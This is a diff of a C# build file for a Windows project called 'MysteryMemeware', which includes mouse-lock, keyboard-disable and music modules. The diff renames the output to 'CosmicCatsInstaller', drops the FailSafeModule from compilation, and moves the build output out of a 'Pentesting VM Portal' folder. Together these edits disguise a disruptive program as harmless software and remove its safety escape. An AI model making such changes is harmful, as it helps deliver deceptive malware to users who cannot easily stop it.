@@ -6,7 +6,7 @@
     <ProjectGuid>{8841B1D0-0B70-458D-960D-F8D6511ACE90}</ProjectGuid>
     <OutputType>WinExe</OutputType>
     <RootNamespace>MysteryMemeware</RootNamespace>
-    <AssemblyName>MysteryMemeware 3.0</AssemblyName>
+    <AssemblyName>CosmicCatsInstaller</AssemblyName>
     <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
     <TargetFrameworkProfile />
     <NuGetPackageImportStamp>
@@ -31,7 +31,7 @@
     <DebugSymbols>true</DebugSymbols>
     <DebugType>full</DebugType>
     <Optimize>false</Optimize>
-    <OutputPath>..\..\Pentesting VM Portal\</OutputPath>
+    <OutputPath>bin\x86\Debug\</OutputPath>
     <DefineConstants>DEBUG;</DefineConstants>
     <ErrorReport>prompt</ErrorReport>
     <WarningLevel>4</WarningLevel>
@@ -69,13 +69,11 @@
     <None Include="app.config" />
     <None Include="ATTACKMETHODS.md" />
     <None Include="LICENSE" />
-    <None Include="My Keys.skl" />
     <None Include="README.md" />
     <None Include="Sharp Keys Keyboard Disable.skl" />
   </ItemGroup>
   <ItemGroup>
     <Compile Include="AssemblyInfo.cs" />
-    <Compile Include="FailSafeModule.cs" />
     <Compile Include="Installer.cs" />
     <Compile Include="MouseLockModule.cs" />
     <Compile Include="MusicModule.cs" />
